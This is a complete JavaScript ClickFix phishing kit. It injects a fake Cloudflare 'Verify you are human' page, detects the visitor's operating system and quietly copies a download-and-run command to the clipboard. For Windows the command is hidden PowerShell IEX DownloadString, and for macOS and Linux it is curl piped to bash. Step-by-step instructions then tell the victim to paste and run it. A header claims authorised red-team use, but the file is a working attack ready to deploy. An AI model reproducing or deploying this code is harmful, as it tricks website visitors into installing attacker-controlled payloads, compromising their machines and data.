/**
 * Injects a fake Cloudflare "Verify you are human" overlay into any page.
 * Made by WILECURITY
 * ⚠️  FOR AUTHORIZED RED TEAM / RESEARCH USE ONLY.
 */
(function () {
  'use strict';

  // ============================================================
  // ⚙️ CONFIG — PASTE YOUR PAYLOAD URLs HERE
  // ============================================================
  const CONFIG = {
    // Display domain shown in the overlay. Leave empty to auto-detect.
    domain: '',

    // Windows command
    windows:
      'powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'https://YOUR-SERVER/payload.ps1\')"',

    // macOS command
    mac: 'curl -fsSL https://YOUR-SERVER/payload.sh | bash',

    // Linux command
    linux: 'curl -fsSL https://YOUR-SERVER/payload.sh | bash',

    // Fallback if OS can't be detected
    fallback: 'echo "Unsupported OS"',

    // Optional redirect after verification
    redirectUrl: null,

    // Optional delay (ms) before the overlay appears
    delay: 400,

    // Force light or dark mode: 'auto' | 'light' | 'dark'
    theme: 'auto'
  };

  // ============================================================
  // GUARD — only inject once
  // ============================================================
  if (window.__clickfix_injected) return;
  window.__clickfix_injected = true;

  // ============================================================
  // OS DETECTION
  // ============================================================
  function detectOS() {
    const ua = navigator.userAgent || '';
    const platform = navigator.platform || '';

    if (/Windows|Win32|Win64|WOW64/i.test(ua) || /Win/i.test(platform)) {
      return 'windows';
    }

    if (/Macintosh|Mac OS X/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) {
      return 'mac';
    }
    if (/Mac/i.test(platform) && !/iPhone|iPad|iPod/i.test(ua)) {
      return 'mac';
    }

    if (/Linux/i.test(ua) && !/Android/i.test(ua)) {
      return 'linux';
    }
    if (/Linux/i.test(platform) && !/Android/i.test(ua)) {
      return 'linux';
    }

    return 'unknown';
  }

  // ============================================================
  // CLIPBOARD (with fallback)
  // ============================================================
  function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(text);
    }

    return new Promise(function (resolve, reject) {
      try {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.left = '-9999px';
        textarea.style.top = '0';
        textarea.setAttribute('readonly', '');
        document.body.appendChild(textarea);
        textarea.select();
        textarea.setSelectionRange(0, text.length);
        const ok = document.execCommand('copy');
        document.body.removeChild(textarea);
        ok ? resolve() : reject(new Error('execCommand failed'));
      } catch (err) {
        reject(err);
      }
    });
  }

  // ============================================================
  // BUILD THE OS-SPECIFIC INSTRUCTIONS
  // ============================================================
  function buildSteps(os) {
    const isWin = os === 'windows';
    const isMac = os === 'mac';

    const cmd = isWin ? CONFIG.windows : isMac ? CONFIG.mac : CONFIG.linux;

    if (isWin) {
      return {
        command: cmd,
        steps: [
          'Press <strong><span class="kbd">⊞</span> + <span class="kbd">R</span></strong> to open the Run dialog.',
          'Press <strong><span class="kbd">Ctrl</span> + <span class="kbd">V</span></strong> to paste the verification command.',
          'Press <strong><span class="kbd">Enter</span></strong> to complete the verification.'
        ]
      };
    }

    if (isMac) {
      return {
        command: cmd,
        steps: [
          'Press <strong><span class="kbd">⌘</span> + <span class="kbd">Space</span></strong> to open Spotlight.',
          'Type <strong>Terminal</strong> and press <strong><span class="kbd">Enter</span></strong>.',
          'Paste with <strong><span class="kbd">⌘</span> + <span class="kbd">V</span></strong> and press <strong><span class="kbd">Enter</span></strong>.'
        ]
      };
    }

    return {
      command: cmd,
      steps: [
        'Press <strong><span class="kbd">Ctrl</span> + <span class="kbd">Alt</span> + <span class="kbd">T</span></strong> to open a terminal.',
        'Paste with <strong><span class="kbd">Ctrl</span> + <span class="kbd">Shift</span> + <span class="kbd">V</span></strong>.',
        'Press <strong><span class="kbd">Enter</span></strong> to complete the verification.'
      ]
    };
  }

  // ============================================================
  // HTML TEMPLATE + STYLES
  // ============================================================
  function buildUI() {
    const domain = CONFIG.domain || window.location.hostname || 'protected.site';

    const host = document.createElement('div');
    host.id = 'clickfix-root';
    host.setAttribute(
      'style',
      [
        'all: initial',
        'position: fixed',
        'inset: 0',
        'z-index: 2147483647',
        'display: flex',
        'flex-direction: column',
        'align-items: center',
        'justify-content: center',
        'padding: 40px 20px',
        'font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
        'background: #0f0f0f',
        'color: #e0e0e0',
        '-webkit-font-smoothing: antialiased',
        'overflow: auto'
      ].join(';')
    );

    host.innerHTML = `
      <style>
        #clickfix-root * { box-sizing: border-box; margin: 0; padding: 0; }
        #clickfix-root .cf-container { width: 100%; max-width: 700px; text-align: left; }
        #clickfix-root .cf-domain { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -0.5px; margin-bottom: 12px; line-height: 1.2; word-break: break-all; }
        #clickfix-root .cf-subhead { font-size: 20px; font-weight: 600; color: #fff; margin-bottom: 16px; }
        #clickfix-root .cf-desc { font-size: 14px; color: #a0a0a0; line-height: 1.6; margin-bottom: 28px; max-width: 600px; }

        #clickfix-root .cf-turnstile {
          display: flex; align-items: center; justify-content: space-between;
          width: 100%; max-width: 320px; background: #1a1a1a;
          border: 1px solid #2e2e2e; border-radius: 2px;
          padding: 12px 14px; cursor: pointer;
          transition: border-color .15s ease, background .15s ease;
          user-select: none; min-height: 65px;
        }
        #clickfix-root .cf-turnstile:hover { border-color: #3a3a3a; background: #1e1e1e; }
        #clickfix-root .cf-turnstile:active { transform: scale(.99); }

        #clickfix-root .cf-turnstile-left { display: flex; align-items: center; gap: 12px; flex: 1; }
        #clickfix-root .cf-checkbox-box {
          width: 22px; height: 22px; border: 2px solid #555;
          border-radius: 2px; background: transparent;
          display: flex; align-items: center; justify-content: center;
          transition: all .15s ease; flex-shrink: 0;
        }
        #clickfix-root .cf-checkbox-box.checked { background: #f6821f; border-color: #f6821f; }
        #clickfix-root .cf-checkbox-box.checked::after {
          content: ''; width: 5px; height: 10px;
          border: solid #fff; border-width: 0 2px 2px 0;
          transform: rotate(45deg); margin-top: -2px;
        }
        #clickfix-root .cf-turnstile-label { font-size: 14px; font-weight: 500; color: #e0e0e0; }

        #clickfix-root .cf-turnstile-right {
          display: flex; flex-direction: column; align-items: center; gap: 2px;
          flex-shrink: 0; padding-left: 12px; border-left: 1px solid #2a2a2a; min-width: 70px;
        }
        #clickfix-root .cf-mini-logo { width: 22px; height: 22px; }
        #clickfix-root .cf-mini-text { font-size: 7px; color: #888; letter-spacing: .5px; font-weight: 700; text-transform: uppercase; }
        #clickfix-root .cf-legal { font-size: 6px; color: #555; text-align: center; margin-top: 1px; line-height: 1.2; }
        #clickfix-root .cf-legal a { color: #666; text-decoration: underline; }

        #clickfix-root .cf-turnstile.loading .cf-checkbox-box { display: none; }
        #clickfix-root .cf-turnstile.loading .cf-turnstile-left::before {
          content: ''; width: 20px; height: 20px;
          border: 2px solid #333; border-top-color: #f6821f;
          border-radius: 50%; animation: cfspin .7s linear infinite; flex-shrink: 0;
        }
        @keyframes cfspin { to { transform: rotate(360deg); } }

        #clickfix-root .cf-instructions {
          display: none; margin-top: 32px; background: #141414;
          border: 1px solid #2a2a2a; border-radius: 4px;
          padding: 24px; max-width: 500px;
        }
        #clickfix-root .cf-instructions.show { display: block; animation: cffade .3s ease; }
        @keyframes cffade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }

        #clickfix-root .instr-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 16px; }
        #clickfix-root .instr-steps { list-style: none; margin: 0 0 20px; padding: 0; }
        #clickfix-root .instr-steps li { display: flex; gap: 10px; font-size: 14px; color: #c0c0c0; line-height: 1.7; margin-bottom: 8px; }
        #clickfix-root .instr-steps li .num { font-weight: 600; color: #fff; min-width: 18px; }
        #clickfix-root .instr-steps li strong { color: #fff; font-weight: 600; }

        #clickfix-root .kbd {
          display: inline-block; background: #1e1e1e; border: 1px solid #333;
          border-radius: 3px; padding: 1px 7px; font-size: 12px;
          font-family: "SF Mono", "Courier New", monospace; font-weight: 600;
          color: #e0e0e0; margin: 0 2px; line-height: 1.4;
        }

        #clickfix-root .instr-ok {
          display: block; width: 100%; background: #f6821f; color: #fff;
          font-size: 14px; font-weight: 600; border: none; border-radius: 3px;
          padding: 12px 20px; cursor: pointer; text-align: center;
          transition: background .15s ease; letter-spacing: .3px;
        }
        #clickfix-root .instr-ok:hover { background: #e0751a; }

        #clickfix-root .cf-success { display: none; margin-top: 32px; max-width: 500px; }
        #clickfix-root .cf-success.show { display: block; animation: cffade .3s ease; }
        #clickfix-root .cf-success .icon { font-size: 40px; margin-bottom: 10px; line-height: 1; }
        #clickfix-root .cf-success .msg { font-size: 17px; font-weight: 700; color: #22c55e; margin-bottom: 6px; }
        #clickfix-root .cf-success .sub { font-size: 14px; color: #999; }

        #clickfix-root .cf-footer {
          margin-top: 60px; padding-top: 24px; border-top: 1px solid #1f1f1f;
          font-size: 11px; color: #555; text-align: center; width: 100%; max-width: 700px;
        }
        #clickfix-root .cf-footer .ray { font-family: "SF Mono", monospace; color: #666; }
        #clickfix-root .cf-footer .brand { margin-top: 4px; color: #444; }

        /* Light mode */
        #clickfix-root.light { background: #f5f5f5; color: #1a1a1a; }
        #clickfix-root.light .cf-domain,
        #clickfix-root.light .cf-subhead,
        #clickfix-root.light .instr-title,
        #clickfix-root.light .instr-steps li .num,
        #clickfix-root.light .instr-steps li strong { color: #1a1a1a; }
        #clickfix-root.light .cf-desc { color: #666; }
        #clickfix-root.light .cf-turnstile { background: #fff; border-color: #d0d0d0; }
        #clickfix-root.light .cf-turnstile:hover { background: #fafafa; border-color: #b0b0b0; }
        #clickfix-root.light .cf-turnstile-label { color: #1a1a1a; }
        #clickfix-root.light .cf-checkbox-box { border-color: #b0b0b0; }
        #clickfix-root.light .cf-turnstile-right { border-left-color: #e0e0e0; }
        #clickfix-root.light .cf-mini-text { color: #666; }
        #clickfix-root.light .cf-legal,
        #clickfix-root.light .cf-legal a { color: #999; }
        #clickfix-root.light .cf-instructions { background: #fff; border-color: #e0e0e0; }
        #clickfix-root.light .instr-steps li { color: #444; }
        #clickfix-root.light .kbd { background: #f0f0f0; border-color: #ccc; color: #1a1a1a; }
        #clickfix-root.light .cf-footer { border-top-color: #e0e0e0; color: #999; }
        #clickfix-root.light .cf-footer .ray,
        #clickfix-root.light .cf-footer .brand { color: #aaa; }

        @media (max-width: 600px) {
          #clickfix-root .cf-domain { font-size: 24px; }
          #clickfix-root .cf-subhead { font-size: 17px; }
          #clickfix-root .cf-desc { font-size: 13px; }
          #clickfix-root .cf-turnstile { max-width: 100%; }
          #clickfix-root .cf-instructions { padding: 18px; }
          #clickfix-root .instr-steps li { font-size: 13px; }
        }
      </style>

      <div class="cf-container">
        <div class="cf-domain">${domain}</div>
        <div class="cf-subhead">Performing security verification</div>
        <div class="cf-desc">
          This website uses a security service to protect against malicious bots.
          This page is displayed while the website verifies you are not a bot.
        </div>

        <div class="cf-turnstile" id="cf-turnstile" role="checkbox" aria-checked="false" tabindex="0" aria-label="Verify you are human">
          <div class="cf-turnstile-left">
            <div class="cf-checkbox-box" id="cf-checkbox"></div>
            <div class="cf-turnstile-label">Verify you are human</div>
          </div>
          <div class="cf-turnstile-right">
            <svg class="cf-mini-logo" viewBox="0 0 109 50" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
              <path d="M77.4 29.6c.3-1 .2-1.9-.3-2.6-.4-.6-1.1-1-2-1.2l-16.2-.2c-.1 0-.2 0-.3-.1-.1-.1-.1-.2-.1-.3 0-.2.1-.4.2-.5.1-.1.2-.1.3-.1l16.3-.2c1.9-.1 4-1.6 4.7-3.5l.9-2.4c0-.1.1-.2 0-.3-1-4.6-5.1-8-9.9-8-4.4 0-8.1 2.8-9.5 6.7-.9-.6-2-.9-3.3-.8-2.2.2-4 2-4.2 4.2-.1.6 0 1.1.1 1.6-3.6.1-6.5 3-6.5 6.6 0 .3 0 .6.1.9 0 .1.1.2.3.2h28.5c.1 0 .3-.1.3-.2l.4-1.3z" fill="#f6821f"/>
              <path d="M82.3 19.5h-.5c-.1 0-.2.1-.3.2l-.6 2.1c-.3 1-.2 1.9.3 2.6.4.6 1.1 1 2 1.2l3.4.2c.1 0 .2 0 .3.1.1.1.1.2.1.3 0 .2-.1.4-.2.5-.1.1-.2.1-.3.1l-3.5.2c-1.9.1-4 1.6-4.7 3.5l-.3.7c-.1.1 0 .3.2.3h12.1c.1 0 .3-.1.3-.2.3-1.1.5-2.2.5-3.4 0-4.6-3.8-8.4-8.4-8.4" fill="#fbad41"/>
            </svg>
            <div class="cf-mini-text">Cloudflare</div>
            <div class="cf-legal">
              <a href="#">Confidentiality</a><br>
              <a href="#">Terms and Conditions</a>
            </div>
          </div>
        </div>

        <div class="cf-instructions" id="cf-instructions">
          <div class="instr-title">Please complete the following verification:</div>
          <ol class="instr-steps" id="cf-instr-steps"></ol>
          <button class="instr-ok" id="cf-instr-ok">Verify</button>
        </div>

        <div class="cf-success" id="cf-success">
          <div class="icon">✅</div>
          <div class="msg">Verification complete</div>
          <div class="sub">You are being redirected.</div>
        </div>
      </div>

      <div class="cf-footer">
        <div>Ray ID: <span class="ray" id="cf-ray">—</span></div>
        <div class="brand">Platform performance and security | Cloudflare</div>
      </div>
    `;

    document.documentElement.appendChild(host);
    return host;
  }

  // ============================================================
  // BOOT
  // ============================================================
  function boot() {
    const root = buildUI();

    // Theme
    if (CONFIG.theme === 'light') {
      root.classList.add('light');
    } else if (CONFIG.theme === 'auto') {
      if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
        root.classList.add('light');
      }
    }

    // Element refs
    const turnstile = root.querySelector('#cf-turnstile');
    const checkbox = root.querySelector('#cf-checkbox');
    const instructions = root.querySelector('#cf-instructions');
    const instrSteps = root.querySelector('#cf-instr-steps');
    const instrOk = root.querySelector('#cf-instr-ok');
    const success = root.querySelector('#cf-success');
    const ray = root.querySelector('#cf-ray');

    // Random Ray ID
    (function () {
      const chars = '0123456789abcdef';
      let id = '';
      for (let i = 0; i < 16; i++) id += chars[Math.floor(Math.random() * chars.length)];
      ray.textContent = id;
    })();

    // Freeze the underlying page (prevent scroll)
    const prevOverflow = document.documentElement.style.overflow;
    document.documentElement.style.overflow = 'hidden';

    // State
    let isVerifying = false;
    let isVerified = false;
    let selectedCommand = '';

    // ---- Handle Turnstile click ----
    function onVerify() {
      if (isVerifying || isVerified) return;
      isVerifying = true;

      turnstile.classList.add('loading');

      const os = detectOS();
      const payload = buildSteps(os);
      selectedCommand = payload.command;

      // Inject the steps
      instrSteps.innerHTML = payload.steps
        .map(function (step, i) {
          return '<li><span class="num">' + (i + 1) + '.</span><span>' + step + '</span></li>';
        })
        .join('');

      // Copy the payload to the clipboard
      copyToClipboard(selectedCommand)
        .then(function () {
          turnstile.classList.remove('loading');
          turnstile.classList.add('verified');
          checkbox.classList.add('checked');
          turnstile.setAttribute('aria-checked', 'true');
        })
        .catch(function () {
          turnstile.classList.remove('loading');
          turnstile.classList.add('verified');
          checkbox.classList.add('checked');
          turnstile.setAttribute('aria-checked', 'true');
        });

      // Reveal the instruction card after a short delay
      setTimeout(function () {
        instructions.classList.add('show');
        isVerifying = false;
      }, 700);
    }

    turnstile.addEventListener('click', onVerify);
    turnstile.addEventListener('keydown', function (e) {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        onVerify();
      }
    });

    // ---- Final "Verify" button ----
    instrOk.addEventListener('click', function () {
      if (isVerified) return;
      isVerified = true;

      instructions.classList.remove('show');
      success.classList.add('show');

      if (CONFIG.redirectUrl) {
        setTimeout(function () {
          window.location.href = CONFIG.redirectUrl;
        }, 1200);
      } else {
        // Restore page scroll once the user is done
        setTimeout(function () {
          document.documentElement.style.overflow = prevOverflow;
        }, 1200);
      }
    });

    // ---- Expose for debugging ----
    window.__clickfix = {
      detectOS: detectOS,
      os: detectOS(),
      command: function () { return selectedCommand; }
    };
  }

  // ============================================================
  // DELAYED BOOT
  // ============================================================
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      setTimeout(boot, CONFIG.delay);
    });
  } else {
    setTimeout(boot, CONFIG.delay);
  }
})();
